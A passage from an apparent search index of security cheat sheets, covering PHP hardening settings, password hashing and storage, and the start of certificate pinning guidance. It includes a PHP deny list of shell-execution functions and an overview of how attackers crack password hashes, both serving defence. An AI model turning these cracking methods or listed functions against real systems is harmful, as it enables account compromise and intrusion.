general settings"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-file-upload-handling","text":"file_uploads = On upload_tmp_dir = /path/PHP-uploads/ upload_max_filesize = 2M max_file_uploads = 2 If your application is not using file uploads, and say the only data the user will enter / upload is forms that do not require any document attachments, file_uploads should be turned Off .","title":"PHP file upload handling"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-executable-handling","text":"enable_dl = Off disable_functions = system, exec, shell_exec, passthru, phpinfo, show_source, highlight_file, popen, proc_open, fopen_with_path, dbmopen, dbase_open, putenv, move_uploaded_file, chdir, mkdir, rmdir, chmod, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo # see also: http://ir.php.net/features.safe-mode disable_classes = These are dangerous PHP functions. You should disable all that you don't use.","title":"PHP executable handling"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#php-session-handling","text":"Session settings are some of the MOST important values to concentrate on in configuring. It is a good practice to change session.name to something new. session.save_path = /path/PHP-session/ session.name = myPHPSESSID session.auto_start = Off session.use_trans_sid = 0 session.cookie_domain = full.qualified.domain.name #session.cookie_path = /application/path/ session.use_strict_mode = 1 session.use_cookies = 1 session.use_only_cookies = 1 session.cookie_lifetime = 14400 # 4 hours session.cookie_secure = 1 session.cookie_httponly = 1 session.cookie_samesite = Strict session.cache_expire = 30 session.sid_length = 256 session.sid_bits_per_character = 6 # PHP 7.2+ session.hash_function = 1 # PHP 7.0-7.1 session.hash_bits_per_character = 6 # PHP 7.0-7.1","title":"PHP session handling"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#some-more-security-paranoid-checks","text":"session.referer_check = /application/path memory_limit = 50M post_max_size = 20M max_execution_time = 60 report_memleaks = On track_errors = Off html_errors = Off","title":"Some more security paranoid checks"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#suhosin","text":"Suhosin is a patch to PHP which provides a number of hardening and security features that are not available in the default PHP build. However, Suhosin only works with PHP 5, which is unsupported and should not be used . For PHP 7, there is Suhosin-ng , but it's in a prerelease stage, and as such should not be used in production .","title":"Suhosin"},{"location":"cheatsheets/PHP_Configuration_Cheat_Sheet.html#snuffleupagus","text":"Snuffleupagus is the spiritual descendent of Suhosin for PHP 7 and onwards, with modern features . It's considered stable, and is usable in production.","title":"Snuffleupagus"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html","text":"Password Storage Cheat Sheet \u00b6 Introduction \u00b6 As the majority of users will re-use passwords between different applications, it is important to store passwords in a way that prevents them from being obtained by an attacker, even if the application or database is compromised. As with most areas of cryptography, there are many different factors that need to be considered, but fortunately, the majority of modern languages and frameworks provide built-in functionality to help store passwords, which handles much of the complexity. This Cheat Sheet provides guidance on the various areas that need to be considered related to storing passwords. In short: Use Bcrypt unless you have a good reason not to. Set a reasonable work factor for your system. Use a salt (modern algorithms do this for you automatically). Consider using a pepper to provide an additional defence in depth (though alone it provides no additional secure characteristics). Background \u00b6 Hashing vs Encryption \u00b6 Hashing and encryption are two terms that are often confused or used incorrectly. The key difference between them is that hashing is a one way function (i.e, it is not possible to \"decrypt\" a hash and obtain the original value), whereas encryption is a two-way function. In almost all circumstances, passwords should be hashed rather than encrypted, as this makes it difficult or impossible for an attacker to obtain the original passwords from the hashes. Encryption should only be used in edge cases where it is necessary to be able to obtain the original password. Some examples of where this might be necessary are: If the application needs to use the password to authenticate against an external legacy system that doesn't support SSO. If it is necessary to retrieve individual characters from the password. The ability to decrypt passwords represents a serious security risk, so it should be fully risk assessed. Where possible, an alternative architecture should be used to avoid the need to store passwords in an encrypted form. This Cheat Sheet is focused on password hashing - for further guidance on encrypting passwords see the Cryptographic Storage Cheat Sheet . How Attackers Crack Password Hashes \u00b6 Although it is not possible to \"decrypt\" password hashes to obtain the original passwords, in some circumstances it is possible to \"crack\" the hashes. The basic steps are: Select a likely candidate (such as \"password\"). Calculate the hash of the input. Compare it to the target hash. This process is then repeated for a large number of potential candidate passwords until a match is found. There are a large number of different methods that can be used to select candidate passwords, including: Brute force (trying every possible candidate). Dictionaries or wordlists of common passwords Lists of passwords obtained from other compromised sites. More sophisticated algorithms such as Markov chains or PRINCE Patterns or masks (such as \"1 capital letter, 6 lowercase letters, 1 number\"). The cracking process is not guaranteed to be successful, and the success rate will depend on a number of factors: The strength of the password. The speed of the algorithm (or work factor for modern algorithms). The number of passwords being targeted (assuming they have unique salts). Strong passwords stored with modern hashing algorithms should be effectively impossible for an attacker to crack. Hashing Concepts \u00b6 Salting \u00b6 A salt is a unique, randomly generated string that is added to each password as part of the hashing process. As the salt is unique for every user, an attacker has to crack hashes one at a time using the respective salt, rather than being able to calculate a hash once and compare it against every stored hash. This makes cracking large numbers of hashes significantly harder, as the time required grows in direct proportion to the number of hashes. Salting also provides protection against an attacker pre-computing hashes using rainbow tables or database-based lookups. Finally, salting means that it is not possible to determine whether two users have the same password without cracking the hashes, as the different salts will result in different hashes even if the passwords are the same. Modern hashing algorithms such as Argon2 or Bcrypt automatically salt the passwords, so no additional steps are required when using them. However, if you are using a legacy password hashing algorithm then salting needs to be implemented manually. The basic steps to perform this are: Generate a salt using a cryptographically secure function . The salt should be at least 16 characters long. Encode the salt into a safe character set such as hexadecimal or Base64. Combine the salt with the password. This can be done using simple concatenation, or a construct such as a HMAC. Hash the combined password and salt. Store the salt and the password hash. Peppering \u00b6 A pepper can be used in addition to salting to provide an additional layer of protection. It is similar to a salt but has four key differences: The pepper is shared between all stored passwords , rather than being unique like a salt. This makes a pepper predicable, and attempts to crack a password hash probabilistic . The static nature of a pepper also *weakens\" hash collision resistance whereas the salt improves hash collision resistance by extending the length with unique characters that increase the entropy of input to the hashing function. The pepper is not stored in the database , unlike many implementations of a password salt (but not always true for a salt). The pepper is not a mechanism to make password cracking too hard to be feasible for an attacker, like many password storage protections (salting among these) aim to do. A salt prevents attackers from compiling rainbow tables of known passwords, however a pepper does not offer this characteristic The purpose of the pepper is to prevent an attacker from being able to crack any of the hashes if they only have access to the database, for example if they have exploited a SQL injection vulnerability or obtained a backup of the database. The pepper should be at-least 32 characters long and should be randomly generated using a secure pseudo-random generator (CSPRNG). It should be stored securely in a \"secrets vault\" (not in an application configuration file regardless of file permissions which are susceptible to SSRF) using the secure access APIs, or for optimal secure storage store the pepper in a Hardware Security Module (HSM) if possible. Read about Cryptographically Weak Pseudo-Random Number Generator (PRNG) The pepper is often used in a similar way to a salt by concatenating it with the password prior to hashing, using a construct such as hash($pepper . $password) . While concatenating is considered appropriate for a salt, only prefixing is considered appropriate for a pepper. Never place a pepper as a suffix as this may lead to vulnerabilities such as issues related to truncation and length-extension attacks. Practically these threats allow the input password component to validate successfully because the unique password is never truncated, only the probabilistic pepper would be truncated. Alternatives \u00b6 An alternative pepper approach is to hash the passwords as usual (specifically one-way hashing) and then encrypt the hashes with a symmetrical encryption key before storing them in the database, with the key acting as the pepper without effecting the password directly or the hash function in any way. This avoids known issues with the concatenation/prefix approach and it allows for password to remain valid when you apply key rotation (using established encryption key rotation procedures) if the key that acts as a pepper is believed to be compromised. Another solution may be storing the secret pepper with an ID to easily retrieve it, and past known peppers. When you store a password hash, store only the ID of the pepper in the database alongside the associated password hashes. This allows rotation of the pepper without disclosing the secret pepper itself. When the pepper needs to be updated, this ID can be updated for hashes using the new pepper. The requires the application logic to additionally associate an ID to an external store with all the pepper secret values that are valid and currently in use, which may or may not be possible for all secret stores (HSM and secret vaults typically support a lookup ID). Work Factors \u00b6 The work factor is essentially the number of iterations of the hashing algorithm that are performed for each password (usually it's actually 2^work iterations). The purpose of the work factor is to make calculating the hash more computationally expensive, which in turn reduces the speed at which an attacker can attempt to crack the password hash. The work factor is typically stored in the hash output. When choosing a work factor, a balance needs to be struck between security and performance. Higher work factors will make the hashes more difficult for an attacker to crack, but will also make the process of verifying a login attempt slower. If the work factor is too high, this may degrade the performance of the application, and could also be used by an attacker to carry out a denial of service attack by making a large number of login attempts to exhaust the server's CPU. There is no golden rule for the ideal work factor - it will depend on the performance of the server and the number of users on the application. Determining the optimal work factor will require experimentation on the specific server(s) used by the application. As a general rule, calculating a hash should take less than one second, although on higher traffic sites it should be significantly less than this. Upgrading the Work Factor \u00b6 One key advantage of having a work factor is that it can be increased over time as hardware becomes more powerful and cheaper. Taking Moore's Law (i.e, that computational power at a given price point doubles every eighteen months) as a rough approximation, this means that the work factor should be increased by 1 every eighteen months. The most common approach to upgrading the work factor is to wait until the user next authenticates, and then to re-hash their password with the new work factor. This means that different hashes will have different work factors, and may result in hashes never being upgraded if the user doesn't log back in to the application. Depending on the application, it may be appropriate to remove the older password hashes and require users to reset their passwords next time they need to login, in order to avoid storing older and less secure hashes. In some cases, it may be possible to increase the work factor of the hashes without the original password, although this is not supported by common hashing algorithms such as Bcrypt and PBKDF2. Maximum Password Lengths \u00b6 Some hashing algorithms such as Bcrypt have a maximum length for the input, which is 72 characters for most implementations (there are some reports that other implementations have lower maximum lengths, but none have been identified at the time of writing). Where Bcrypt is used, a maximum length of 64 characters should be enforced on the input, as this provides a sufficiently high limit, while still allowing for string termination issues and not revealing that the application uses Bcrypt. Additionally, due to how computationally expensive modern hashing functions are, if a user can supply very long passwords then there is a potential denial of service vulnerability, such as the one published in Django in 2013. In order to protect against both of these issues, a maximum password length should be enforced. This should be 64 characters for Bcrypt (due to limitations in the algorithm and implementations), and between 64 and 128 characters for other algorithms. Although implementing a maximum password length does reduce the possible keyspace for passwords, a limit of 64 characters still leaves a key space of at least 2^420 , which is completely infeasible for an attacker to break. As such, it does not represent a meaningful reduction in security. Pre-Hashing Passwords \u00b6 An alternative approach is to pre-hash the user-supplied password with a fast algorithm such as SHA-256, and then to hash the resultant hash with a more secure algorithm such as Bcrypt (i.e, bcrypt(sha256($password)) ). While this approach solves the problem of arbitrary length user inputs to slower hashing algorithms, it also introduces some vulnerabilities that could allow attackers to crack hashes more easily. If an attacker is able to obtain password hashes from two different compromised sites, one of which is storing passwords with bcrypt(sha256($password)) and the other of which is storing them as plain sha256($password) , and attacker can use uncracked SHA-256 hashes from the second site as candidate passwords to try and crack the hashes from the first (more secure) site. If passwords are re-used between the two sites, this can effectively allow the attacker to strip off the Bcrypt layer, and then to focus their efforts on cracking the much easier SHA-256 hashes. When using pre-hashing ensure that the output for the first hashing algorithm is safely encoded as hexadecimal or base64, as some hashing algorithms such as Bcrypt can behave in undesirable ways if the input contains null bytes . Due to these issues, the preferred option should generally be to limit the maximum password length. Pre-hashing of passwords should only be performed where there is a specific requirement to do so, and appropriate steps have been taking to mitigate the issues discussed above. Password Hashing Algorithms \u00b6 Modern Algorithms \u00b6 There are a number of modern hashing algorithms that have been specifically designed for securely storing passwords. This means that they should be slow (unlike algorithms such as MD5 and SHA-1 which were designed to be fast), and how slow they are can be configured by changing the work factor . The main three algorithms that should be considered as listed below. Argon2id \u00b6 Argon2 is the winner of the 2015 Password Hashing Competition . There are three different versions of the algorithm, and the Argon2 id variant should be used where available, as it provides a balanced approach to resisting both side channel and GPU-based attacks. Rather than a simple work factor like other algorithms, Argon2 has three different parameters that can be configured, meaning that it's more complicated to correctly tune for the environment. The specification contains guidance on choosing appropriate parameters , however, if you're not in a position to properly tune it, then a simpler algorithm such as Bcrypt may be a better choice. PBKDF2 \u00b6 PBKDF2 is recommended by NIST and has FIPS-140 validated implementations. So, it should be the preferred algorithm when these are required. Additionally, it is supported out of the box in the .NET framework, so is commonly used in ASP.NET applications. PBKDF2 can be used with HMACs based on a number of different hashing algorithms. HMAC-SHA-256 is widely supported and is recommended by NIST. The work factor for PBKDF2 is implemented through the iteration count, which should be at least 10,000 (although values of up to 100,000 may be appropriate in higher security environments). Bcrypt \u00b6 Bcrypt is the most widely supported of the algorithms and should be the default choice unless there are specific requirements for PBKDF2, or appropriate knowledge to tune Argon2. The default work factor for Bcrypt is 10, and this should generally be raised to 12 unless operating on older or lower-powered systems. Legacy Algorithms \u00b6 In some circumstances it is not possible to use modern hashing algorithms , usually due to the use of legacy language or environments. Where possible, third party libraries should be used to provide these algorithms. However, if the only algorithms available are legacy ones such as MD5 and SHA-1, then there are a number of steps that can be taken to improve the security of stored passwords. Use the strongest algorithm available (SHA-512 > SHA-256 > SHA-1 > MD5). Use a pepper . Use a unique salt for each password, generated using a cryptographically secure random number generator . Use a very large number of iterations of the algorithm (at least 10,000, and possibly significantly more depending on the speed of the hardware). It should be emphasised that these steps are not as good as using a modern hashing algorithm , and that this approach should only be taken where no other options are available. Upgrading Legacy Hashes \u00b6 For older applications that were built using less secure hashing algorithms such as MD5 or SHA-1, these hashes should be upgraded to more modern and secure ones. When the user next enters their password (usually by authenticating on the application), it should be re-hashed using the new algorithm. It would also be good practice to expire the users' current password and require them to enter a new one, so that any older (less secure) hashes of their password are no longer useful to an attacker. However, this approach means that old (less secure) password hashes will be stored in the database until the user next logs in and may be stored indefinitely. There are two main approaches that can be taken to solve this. One method is to expire and delete the password hashes of users who have been inactive for a long period, and require them to reset their passwords to login again. Although secure, this approach is not particularly user friendly, and expiring the passwords of a large number of users may cause issues for the support staff, or may be interpreted by users as an indication of a breach. However, if there is a reasonable delay between implementing the password hash upgrade code on login and removing old password hashes, most active users should have changed their passwords already. An alternative approach is to use the existing password hashes as inputs for a more secure algorithm. For example if the application originally stored passwords as md5($password) , this could be easily upgraded to bcrypt(md5($password)) . Layering the hashes in this manner avoids the need to known the original password, however it can make the hashes easier to crack, as discussed in the Pre-Hashing Passwords section. As such, these hashes should be replaced with direct hashes of the users' passwords next time the users login. Custom Algorithms \u00b6 Writing custom cryptographic code such as a hashing algorithm is really hard and should never be done outside of an academic exercise. Any potential benefit that you might have from using an unknown or bespoke algorithm will be vastly overshadowed by the weaknesses that exist in it. Do not do this.","title":"Password Storage"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#password-storage-cheat-sheet","text":"","title":"Password Storage Cheat Sheet"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#introduction","text":"As the majority of users will re-use passwords between different applications, it is important to store passwords in a way that prevents them from being obtained by an attacker, even if the application or database is compromised. As with most areas of cryptography, there are many different factors that need to be considered, but fortunately, the majority of modern languages and frameworks provide built-in functionality to help store passwords, which handles much of the complexity. This Cheat Sheet provides guidance on the various areas that need to be considered related to storing passwords. In short: Use Bcrypt unless you have a good reason not to. Set a reasonable work factor for your system. Use a salt (modern algorithms do this for you automatically). Consider using a pepper to provide an additional defence in depth (though alone it provides no additional secure characteristics).","title":"Introduction"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#background","text":"","title":"Background"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#hashing-vs-encryption","text":"Hashing and encryption are two terms that are often confused or used incorrectly. The key difference between them is that hashing is a one way function (i.e, it is not possible to \"decrypt\" a hash and obtain the original value), whereas encryption is a two-way function. In almost all circumstances, passwords should be hashed rather than encrypted, as this makes it difficult or impossible for an attacker to obtain the original passwords from the hashes. Encryption should only be used in edge cases where it is necessary to be able to obtain the original password. Some examples of where this might be necessary are: If the application needs to use the password to authenticate against an external legacy system that doesn't support SSO. If it is necessary to retrieve individual characters from the password. The ability to decrypt passwords represents a serious security risk, so it should be fully risk assessed. Where possible, an alternative architecture should be used to avoid the need to store passwords in an encrypted form. This Cheat Sheet is focused on password hashing - for further guidance on encrypting passwords see the Cryptographic Storage Cheat Sheet .","title":"Hashing vs Encryption"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#how-attackers-crack-password-hashes","text":"Although it is not possible to \"decrypt\" password hashes to obtain the original passwords, in some circumstances it is possible to \"crack\" the hashes. The basic steps are: Select a likely candidate (such as \"password\"). Calculate the hash of the input. Compare it to the target hash. This process is then repeated for a large number of potential candidate passwords until a match is found. There are a large number of different methods that can be used to select candidate passwords, including: Brute force (trying every possible candidate). Dictionaries or wordlists of common passwords Lists of passwords obtained from other compromised sites. More sophisticated algorithms such as Markov chains or PRINCE Patterns or masks (such as \"1 capital letter, 6 lowercase letters, 1 number\"). The cracking process is not guaranteed to be successful, and the success rate will depend on a number of factors: The strength of the password. The speed of the algorithm (or work factor for modern algorithms). The number of passwords being targeted (assuming they have unique salts). Strong passwords stored with modern hashing algorithms should be effectively impossible for an attacker to crack.","title":"How Attackers Crack Password Hashes"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#hashing-concepts","text":"","title":"Hashing Concepts"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#salting","text":"A salt is a unique, randomly generated string that is added to each password as part of the hashing process. As the salt is unique for every user, an attacker has to crack hashes one at a time using the respective salt, rather than being able to calculate a hash once and compare it against every stored hash. This makes cracking large numbers of hashes significantly harder, as the time required grows in direct proportion to the number of hashes. Salting also provides protection against an attacker pre-computing hashes using rainbow tables or database-based lookups. Finally, salting means that it is not possible to determine whether two users have the same password without cracking the hashes, as the different salts will result in different hashes even if the passwords are the same. Modern hashing algorithms such as Argon2 or Bcrypt automatically salt the passwords, so no additional steps are required when using them. However, if you are using a legacy password hashing algorithm then salting needs to be implemented manually. The basic steps to perform this are: Generate a salt using a cryptographically secure function . The salt should be at least 16 characters long. Encode the salt into a safe character set such as hexadecimal or Base64. Combine the salt with the password. This can be done using simple concatenation, or a construct such as a HMAC. Hash the combined password and salt. Store the salt and the password hash.","title":"Salting"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#peppering","text":"A pepper can be used in addition to salting to provide an additional layer of protection. It is similar to a salt but has four key differences: The pepper is shared between all stored passwords , rather than being unique like a salt. This makes a pepper predicable, and attempts to crack a password hash probabilistic . The static nature of a pepper also *weakens\" hash collision resistance whereas the salt improves hash collision resistance by extending the length with unique characters that increase the entropy of input to the hashing function. The pepper is not stored in the database , unlike many implementations of a password salt (but not always true for a salt). The pepper is not a mechanism to make password cracking too hard to be feasible for an attacker, like many password storage protections (salting among these) aim to do. A salt prevents attackers from compiling rainbow tables of known passwords, however a pepper does not offer this characteristic The purpose of the pepper is to prevent an attacker from being able to crack any of the hashes if they only have access to the database, for example if they have exploited a SQL injection vulnerability or obtained a backup of the database. The pepper should be at-least 32 characters long and should be randomly generated using a secure pseudo-random generator (CSPRNG). It should be stored securely in a \"secrets vault\" (not in an application configuration file regardless of file permissions which are susceptible to SSRF) using the secure access APIs, or for optimal secure storage store the pepper in a Hardware Security Module (HSM) if possible. Read about Cryptographically Weak Pseudo-Random Number Generator (PRNG) The pepper is often used in a similar way to a salt by concatenating it with the password prior to hashing, using a construct such as hash($pepper . $password) . While concatenating is considered appropriate for a salt, only prefixing is considered appropriate for a pepper. Never place a pepper as a suffix as this may lead to vulnerabilities such as issues related to truncation and length-extension attacks. Practically these threats allow the input password component to validate successfully because the unique password is never truncated, only the probabilistic pepper would be truncated.","title":"Peppering"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#alternatives","text":"An alternative pepper approach is to hash the passwords as usual (specifically one-way hashing) and then encrypt the hashes with a symmetrical encryption key before storing them in the database, with the key acting as the pepper without effecting the password directly or the hash function in any way. This avoids known issues with the concatenation/prefix approach and it allows for password to remain valid when you apply key rotation (using established encryption key rotation procedures) if the key that acts as a pepper is believed to be compromised. Another solution may be storing the secret pepper with an ID to easily retrieve it, and past known peppers. When you store a password hash, store only the ID of the pepper in the database alongside the associated password hashes. This allows rotation of the pepper without disclosing the secret pepper itself. When the pepper needs to be updated, this ID can be updated for hashes using the new pepper. The requires the application logic to additionally associate an ID to an external store with all the pepper secret values that are valid and currently in use, which may or may not be possible for all secret stores (HSM and secret vaults typically support a lookup ID).","title":"Alternatives"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#work-factors","text":"The work factor is essentially the number of iterations of the hashing algorithm that are performed for each password (usually it's actually 2^work iterations). The purpose of the work factor is to make calculating the hash more computationally expensive, which in turn reduces the speed at which an attacker can attempt to crack the password hash. The work factor is typically stored in the hash output. When choosing a work factor, a balance needs to be struck between security and performance. Higher work factors will make the hashes more difficult for an attacker to crack, but will also make the process of verifying a login attempt slower. If the work factor is too high, this may degrade the performance of the application, and could also be used by an attacker to carry out a denial of service attack by making a large number of login attempts to exhaust the server's CPU. There is no golden rule for the ideal work factor - it will depend on the performance of the server and the number of users on the application. Determining the optimal work factor will require experimentation on the specific server(s) used by the application. As a general rule, calculating a hash should take less than one second, although on higher traffic sites it should be significantly less than this.","title":"Work Factors"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#upgrading-the-work-factor","text":"One key advantage of having a work factor is that it can be increased over time as hardware becomes more powerful and cheaper. Taking Moore's Law (i.e, that computational power at a given price point doubles every eighteen months) as a rough approximation, this means that the work factor should be increased by 1 every eighteen months. The most common approach to upgrading the work factor is to wait until the user next authenticates, and then to re-hash their password with the new work factor. This means that different hashes will have different work factors, and may result in hashes never being upgraded if the user doesn't log back in to the application. Depending on the application, it may be appropriate to remove the older password hashes and require users to reset their passwords next time they need to login, in order to avoid storing older and less secure hashes. In some cases, it may be possible to increase the work factor of the hashes without the original password, although this is not supported by common hashing algorithms such as Bcrypt and PBKDF2.","title":"Upgrading the Work Factor"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#maximum-password-lengths","text":"Some hashing algorithms such as Bcrypt have a maximum length for the input, which is 72 characters for most implementations (there are some reports that other implementations have lower maximum lengths, but none have been identified at the time of writing). Where Bcrypt is used, a maximum length of 64 characters should be enforced on the input, as this provides a sufficiently high limit, while still allowing for string termination issues and not revealing that the application uses Bcrypt. Additionally, due to how computationally expensive modern hashing functions are, if a user can supply very long passwords then there is a potential denial of service vulnerability, such as the one published in Django in 2013. In order to protect against both of these issues, a maximum password length should be enforced. This should be 64 characters for Bcrypt (due to limitations in the algorithm and implementations), and between 64 and 128 characters for other algorithms. Although implementing a maximum password length does reduce the possible keyspace for passwords, a limit of 64 characters still leaves a key space of at least 2^420 , which is completely infeasible for an attacker to break. As such, it does not represent a meaningful reduction in security.","title":"Maximum Password Lengths"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#pre-hashing-passwords","text":"An alternative approach is to pre-hash the user-supplied password with a fast algorithm such as SHA-256, and then to hash the resultant hash with a more secure algorithm such as Bcrypt (i.e, bcrypt(sha256($password)) ). While this approach solves the problem of arbitrary length user inputs to slower hashing algorithms, it also introduces some vulnerabilities that could allow attackers to crack hashes more easily. If an attacker is able to obtain password hashes from two different compromised sites, one of which is storing passwords with bcrypt(sha256($password)) and the other of which is storing them as plain sha256($password) , and attacker can use uncracked SHA-256 hashes from the second site as candidate passwords to try and crack the hashes from the first (more secure) site. If passwords are re-used between the two sites, this can effectively allow the attacker to strip off the Bcrypt layer, and then to focus their efforts on cracking the much easier SHA-256 hashes. When using pre-hashing ensure that the output for the first hashing algorithm is safely encoded as hexadecimal or base64, as some hashing algorithms such as Bcrypt can behave in undesirable ways if the input contains null bytes . Due to these issues, the preferred option should generally be to limit the maximum password length. Pre-hashing of passwords should only be performed where there is a specific requirement to do so, and appropriate steps have been taking to mitigate the issues discussed above.","title":"Pre-Hashing Passwords"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#password-hashing-algorithms","text":"","title":"Password Hashing Algorithms"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#modern-algorithms","text":"There are a number of modern hashing algorithms that have been specifically designed for securely storing passwords. This means that they should be slow (unlike algorithms such as MD5 and SHA-1 which were designed to be fast), and how slow they are can be configured by changing the work factor . The main three algorithms that should be considered as listed below.","title":"Modern Algorithms"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#argon2id","text":"Argon2 is the winner of the 2015 Password Hashing Competition . There are three different versions of the algorithm, and the Argon2 id variant should be used where available, as it provides a balanced approach to resisting both side channel and GPU-based attacks. Rather than a simple work factor like other algorithms, Argon2 has three different parameters that can be configured, meaning that it's more complicated to correctly tune for the environment. The specification contains guidance on choosing appropriate parameters , however, if you're not in a position to properly tune it, then a simpler algorithm such as Bcrypt may be a better choice.","title":"Argon2id"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2","text":"PBKDF2 is recommended by NIST and has FIPS-140 validated implementations. So, it should be the preferred algorithm when these are required. Additionally, it is supported out of the box in the .NET framework, so is commonly used in ASP.NET applications. PBKDF2 can be used with HMACs based on a number of different hashing algorithms. HMAC-SHA-256 is widely supported and is recommended by NIST. The work factor for PBKDF2 is implemented through the iteration count, which should be at least 10,000 (although values of up to 100,000 may be appropriate in higher security environments).","title":"PBKDF2"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#bcrypt","text":"Bcrypt is the most widely supported of the algorithms and should be the default choice unless there are specific requirements for PBKDF2, or appropriate knowledge to tune Argon2. The default work factor for Bcrypt is 10, and this should generally be raised to 12 unless operating on older or lower-powered systems.","title":"Bcrypt"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#legacy-algorithms","text":"In some circumstances it is not possible to use modern hashing algorithms , usually due to the use of legacy language or environments. Where possible, third party libraries should be used to provide these algorithms. However, if the only algorithms available are legacy ones such as MD5 and SHA-1, then there are a number of steps that can be taken to improve the security of stored passwords. Use the strongest algorithm available (SHA-512 > SHA-256 > SHA-1 > MD5). Use a pepper . Use a unique salt for each password, generated using a cryptographically secure random number generator . Use a very large number of iterations of the algorithm (at least 10,000, and possibly significantly more depending on the speed of the hardware). It should be emphasised that these steps are not as good as using a modern hashing algorithm , and that this approach should only be taken where no other options are available.","title":"Legacy Algorithms"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#upgrading-legacy-hashes","text":"For older applications that were built using less secure hashing algorithms such as MD5 or SHA-1, these hashes should be upgraded to more modern and secure ones. When the user next enters their password (usually by authenticating on the application), it should be re-hashed using the new algorithm. It would also be good practice to expire the users' current password and require them to enter a new one, so that any older (less secure) hashes of their password are no longer useful to an attacker. However, this approach means that old (less secure) password hashes will be stored in the database until the user next logs in and may be stored indefinitely. There are two main approaches that can be taken to solve this. One method is to expire and delete the password hashes of users who have been inactive for a long period, and require them to reset their passwords to login again. Although secure, this approach is not particularly user friendly, and expiring the passwords of a large number of users may cause issues for the support staff, or may be interpreted by users as an indication of a breach. However, if there is a reasonable delay between implementing the password hash upgrade code on login and removing old password hashes, most active users should have changed their passwords already. An alternative approach is to use the existing password hashes as inputs for a more secure algorithm. For example if the application originally stored passwords as md5($password) , this could be easily upgraded to bcrypt(md5($password)) . Layering the hashes in this manner avoids the need to known the original password, however it can make the hashes easier to crack, as discussed in the Pre-Hashing Passwords section. As such, these hashes should be replaced with direct hashes of the users' passwords next time the users login.","title":"Upgrading Legacy Hashes"},{"location":"cheatsheets/Password_Storage_Cheat_Sheet.html#custom-algorithms","text":"Writing custom cryptographic code such as a hashing algorithm is really hard and should never be done outside of an academic exercise. Any potential benefit that you might have from using an unknown or bespoke algorithm will be vastly overshadowed by the weaknesses that exist in it. Do not do this.","title":"Custom Algorithms"},{"location":"cheatsheets/Pinning_Cheat_Sheet.html","text":"Pinning Cheat Sheet \u00b6 Introduction \u00b6 The Pinning Cheat Sheet is a technical guide to implementing certificate and public key pinning as discussed at the Virginia chapter's presentation Securing Wireless Channels in the Mobile Space . This guide is focused on providing clear, simple, actionable guidance for securing the channel in a hostile environment where actors could be malicious and the conference of trust a liability. What's the problem \u00b6 Users, developers, and applications expect end-to-end security on their secure channels, but some secure channels are not meeting the expectation. Specifically, channels built using well known protocols such as VPN, SSL, and TLS can be vulnerable to a number of attacks. What Is Pinning \u00b6 Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable, then the program holds a pinset (taking from Jon Larimer and Kenny Root Google I/O talk ). In this case, the advertised identity must match one of the elements in the pinset. A host or service's certificate or public key can be added to an application at development time, or it can be added upon first encountering the certificate or public key. The former - adding at development time - is preferred since preloading the certificate or public key out of band usually means the attacker cannot taint the pin. When Do You Pin \u00b6 You should pin anytime you want to be relatively certain of the remote host's identity or when operating in a hostile environment. Since one or both are almost always true, you should probably pin all the time. When Do You Whitelist \u00b6 If you are working for an organization which practices \"egress filtering\" as part of a Data Loss Prevention (DLP) strategy, you will likely encounter Interception Proxies . I like to refer to these things as \"good\" bad guys (as opposed to \"bad\" bad guys ) since both break end-to-end security and we can't tell them apart. In this case, do not offer to whitelist the interception proxy since it defeats your security goals. Add the interception proxy's public key to your pinset after being instructed to do so by the folks in Risk Acceptance. How Do You Pin \u00b6 The idea is to re-use the exiting protocols and infrastructure, but use them in a hardened manner. For re-use, a program would keep doing the things it used to do when establishing a secure connection. To harden the channel, the program would take advantage of the OnConnect callback offered by a library, framework or platform. In the callback, the program would verify the remote host's identity by validating its certificate or public key. What Should Be Pinned \u00b6 The first thing to decide is what should be pinned. For this choice, you have two options: Pin the certificate. Pin the public key. If you choose public keys, you have two additional choices: Pin the subjectPublicKeyInfo . Pin one of the concrete types such as RSAPublicKey or DSAPublicKey . subjectPublicKeyInfo : The three choices are explained below in more detail. I would encourage you to pin the subjectPublicKeyInfo because it has the public parameters (such as {e,n} for an RSA public key) and contextual information such as an algorithm and OID. The context will help you keep your bearings at times, and the figure to the right shows the additional information available. Certificate \u00b6 The certificate is easiest to pin. You can fetch the certificate out of band for the website, have the IT folks email your company certificate to you, use openssl s_client to retrieve the certificate etc. At runtime, you retrieve the website or server's certificate in the callback. Within the callback, you compare the retrieved certificate with the certificate embedded within the program. If the comparison fails, then fail the method or function. There is a downside to pinning a certificate. If the site rotates its certificate on a regular basis, then your application would need to be updated regularly. For example, Google rotates its certificates, so you will need to update your application about once a month (if it depended on Google services). Even though Google rotates its certificates, the underlying public keys (within the certificate) remain static. Public Key \u00b6 Public key pinning is more flexible but a little trickier due to the extra steps necessary to extract the public key from a certificate. As with a certificate, the program checks the extracted public key with its embedded copy of the public key. There are two downsides to public key pinning. First, it's harder to work with keys 